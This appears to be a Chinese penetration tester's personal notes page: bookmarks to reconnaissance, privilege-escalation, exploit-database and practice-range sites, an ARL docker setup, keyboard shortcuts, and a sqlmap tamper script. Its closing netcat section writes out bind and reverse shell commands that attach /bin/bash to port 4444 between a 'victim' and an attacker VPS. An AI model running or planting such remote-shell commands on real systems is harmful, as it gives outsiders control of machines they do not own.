## 渗透测试工具集


- Bscan 信息收集工具
- poc扫洞



## 收藏栏

#### 空间搜索引擎

0Zone：https://0.zone/

Fofa：https://fofa.info/toLogin

#### 提权&linux命令

Windows提权&杀软识别：https://i.hacking8.com/tiquan/

Linux提权命令查询：https://gtfobins.github.io/

Linux命令查询：https://wangchujiang.com/linux-command/

#### 沙箱查毒

微步云沙箱：https://s.threatbook.com/

Virustotal：https://www.virustotal.com/gui/home/upload

大圣云沙箱：https://mac-cloud.riskivy.com/detect?theme=vulbox

#### 工具

反弹shell：https://weibell.github.io/reverse-shell-generator/

社工密码生成器：https://www.bugku.com/mima/

文本去重：http://tools.bugscaner.com/quchong/

Curl：https://curlconverter.com/

Exp_DB：https://www.exploit-db.com/

#### 信息收集工具

IP定位：https://www.ipuu.net/Home

DNS解析（查询子域）：https://rapiddns.io/subdomain

phpinfo（子域名爆破）：https://phpinfo.me/domain/

#### 漏洞辅助平台

Dnslog：http://www.dnslog.cn/

XSS盲打：https://xssaq.com/login/

SSRFPayload生成：https://tools.intigriti.io/redirector/#

#### SRC

WooYun：http://wy.zone.ci/

EduSrc：https://src.sjtu.edu.cn/

漏洞盒子：https://www.vulbox.com/projects/list

#### 知识库

网络安全文库：http://wiki.peiqi.tech/

Hacking8：https://www.hacking8.com/

456+（国外安全文库）：https://opensourcelibs.com/libs/hacking-tool

知识星球：https://wx.zsxq.com/dweb2/index/

寻云安全：https://docs.yunjianxx.com/index/index

先知：https://xz.aliyun.com/

火线Zone：https://zone.huoxian.cn/

52破解：https://www.52pojie.cn/forum.php

少客联盟：https://www.cnsuc.net/

#### 安全资讯

微步社区：https://x.threatbook.com/

斗象Freebuf：https://www.freebuf.com/

看雪：https://www.kanxue.com/

安全客：https://www.anquanke.com/

T00ls：https://www.t00ls.com/

--------------------------------------------------------

国光：https://www.sqlsec.com/

算命瞎子：http://www.nmd5.com/

心灵鸡汤君：https://www.xljtj.com/

赏金猎人tips：https://twitter.com/search?q=%23bugbountytips&src=typeahead_click

--------------------------------------------------------

#### 靶场

Pikachu：http://ctf.aabyss.cn/index.php

安鸾：https://www.whalwl.com/challenges

墨者：https://www.mozhe.cn/

赏金猎人：https://www.bugbountyhunter.com/

Vulhub：https://vulhub.org/#/docs/install-docker-one-click/

Vulhub（vbox）：https://www.vulnhub.com/

攻防世界：https://adworld.xctf.org.cn/home/index



#### 资源

果核：https://www.ghxi.com/

蓝米兔：https://www.lanmitu.com/

壁纸：https://wallhaven.cc/toplist

镜像：https://msdn.sjjzm.com/

镜像：https://msdn.itellyou.cn/



## 工具集


ARL资产灯塔系统：https://github.com/TophantTechnology/ARL

Docker 启动
```
git clone https://github.com/TophantTechnology/ARL
cd ARL/docker/
docker volume create arl_db
docker-compose pull
docker-compose up -d 
```

Clash（支持 SS / VMess 协议）: https://github.com/Fndroid/clash_for_windows_pkg/releases

Clash汉化: https://github.com/BoyceLig/Clash_Chinese_Patch/releases

Proxy插件: https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN



## 常用命令

```
按住shift + 右击 能复制文件路径

win +w 小手拖

ctrl + N 打开桌面/新建桌面

cmd  notepad 快速打开一个记事本文件

ctrl + shift + n  鼠标右击 + w + f快速创建一个文件夹

ctrl + w 退出

ctrl + R 刷新

ncpa.cpl 网卡

firewall.cpl

regedit 注册表

ctrl + m 最小化

ctrl + shift + m 最大化

ctrl + w 关闭

ctrl + shift + t 恢复

ctrl+ tab 切换页面

ctrl + win + d  新建桌面

ctrl + win + ← → 切换桌面

ctrl + shift + f 切换繁体 简体 簡體 繁體 哈哈

win + D 显示桌面

compmgmt.msc 计算机管理

gpedit.msc  本地策略编辑器

ctrl +shift +esc 任务管理器

ctrl + 数字 浏览器窗口切换
```

```
linux
ctrl + c 终止命令
ctrl + s 暂停/按任意键恢复
ctrl + a 光标移至输入行首 home键
ctrl + e 光标移至输入行尾 end 键


/str  查找str。n下一个，N上一个。
dd 剪切当前行
yy 复制当前行
p  粘贴内容到下一行
G  定位到最后一行
u  撤销操作

x  保存退出
即 x = wq
!  强制执行命令

```

### 代码模板
#### JavaScript逆向
```
import execjs

with open("./dns.js",'r',encoding='utf-8') as f:

    ctx = execjs.compile(f.read())
    # 调用get_enc方法，传参 1，并将return的值赋给变量enc
    enc = ctx.call(
        "AES_Decrypt",
        'OzVk7hagbpdID5hcIGsWLg==')
    # 打印enc值
    print(enc)

```
#### Tamper
```
import execjs
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass


def tamper(payload, **kwargs):
    with open(r"E:\PyProject\tamper\aes.js") as f:
        ctx = execjs.compile(f.read())
        enc = ctx.call(
            "AES_Decrypt",
            f"{payload.encode(encoding='utf-8')}"
        )
        str_aes = enc
        return str_aes if payload else payload
```

# 常用命令

## NC

1.正向shell

```
受害者   nc -lvvp 4444 -t -e /bin/bash

vps     nc cl_ip 4444
```

2.反向shell

```
vps 	nc -lvvp 4444

受害者   nc vps_ip 4444 
```

